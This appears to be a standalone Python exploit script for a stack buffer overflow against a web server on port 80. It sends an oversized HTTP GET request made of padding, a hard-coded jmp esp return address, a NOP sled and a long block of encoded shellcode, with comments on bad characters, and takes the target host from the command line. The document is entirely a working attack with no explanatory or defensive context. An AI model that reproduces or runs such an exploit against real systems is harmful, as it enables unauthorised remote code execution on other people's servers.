#!/usr/share/python

import socket,sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1],80))
buff="GET "
buff+="A" * 1787
#jmp esp address: 764b4e5b
buff+="\x5b\x4e\x4b\x76"
#shellcode bad chars: x0d x00
buff+="\x90"*20
#nops 
buff+="\xd9\xe5\xd9\x74\x24\xf4\xbf\x48\x6b\xc9\xe8\x5d\x33\xc9\xb1\x53\x83\xed\xfc\x31\x7d\x13\x03\x35\x78\x2b\x1d\x39\x96\x29\xde\xc1\x67\x4e\x56\x24\x56\x4e\x0c\x2d\xc9\x7e\x46\x63\xe6\xf5\x0a\x97\x7d\x7b\x83\x98\x36\x36\xf5\x97\xc7\x6b\xc5\xb6\x4b\x76\x1a\x18\x75\xb9\x6f\x59\xb2\xa4\x82\x0b\x6b\xa2\x31\xbb\x18\xfe\x89\x30\x52\xee\x89\xa5\x23\x11\xbb\x78\x3f\x48\x1b\x7b\xec\xe0\x12\x63\xf1\xcd\xed\x18\xc1\xba\xef\xc8\x1b\x42\x43\x35\x94\xb1\x9d\x72\x13\x2a\xe8\x8a\x67\xd7\xeb\x49\x15\x03\x79\x49\xbd\xc0\xd9\xb5\x3f\x04\xbf\x3e\x33\xe1\xcb\x18\x50\xf4\x18\x13\x6c\x7d\x9f\xf3\xe4\xc5\x84\xd7\xad\x9e\xa5\x4e\x08\x70\xd9\x90\xf3\x2d\x7f\xdb\x1e\x39\xf2\x86\x76\x8e\x3f\x38\x87\x98\x48\x4b\xb5\x07\xe3\xc3\xf5\xc0\x2d\x14\xf9\xfa\x8a\x8a\x04\x05\xeb\x83\xc2\x51\xbb\xbb\xe3\xd9\x50\x3b\x0b\x0c\xcc\x33\xaa\xff\xf3\xbe\x0c\x50\xb4\x10\xe5\xba\x3b\x4f\x15\xc5\x91\xf8\xbe\x38\x1a\x17\x63\xb4\xfc\x7d\x8b\x90\x57\xe9\x69\xc7\x6f\x8e\x92\x2d\xd8\x38\xda\x27\xdf\x47\xdb\x6d\x77\xdf\x50\x62\x43\xfe\x66\xaf\xe3\x97\xf1\x25\x62\xda\x60\x39\xaf\x8c\x01\xa8\x34\x4c\x4f\xd1\xe2\x1b\x18\x27\xfb\xc9\xb4\x1e\x55\xef\x44\xc6\x9e\xab\x92\x3b\x20\x32\x56\x07\x06\x24\xae\x88\x02\x10\x7e\xdf\xdc\xce\x38\x89\xae\xb8\x92\x66\x79\x2c\x62\x45\xba\x2a\x6b\x80\x4c\xd2\xda\x7d\x09\xed\xd3\xe9\x9d\x96\x09\x8a\x62\x4d\x8a\xba\x28\xcf\xbb\x52\xf5\x9a\xf9\x3e\x06\x71\x3d\x47\x85\x73\xbe\xbc\x95\xf6\xbb\xf9\x11\xeb\xb1\x92\xf7\x0b\x65\x92\xdd"
buff+=" HTTP/1.1\r\n\r\n"
s.send(buff)
s.close()
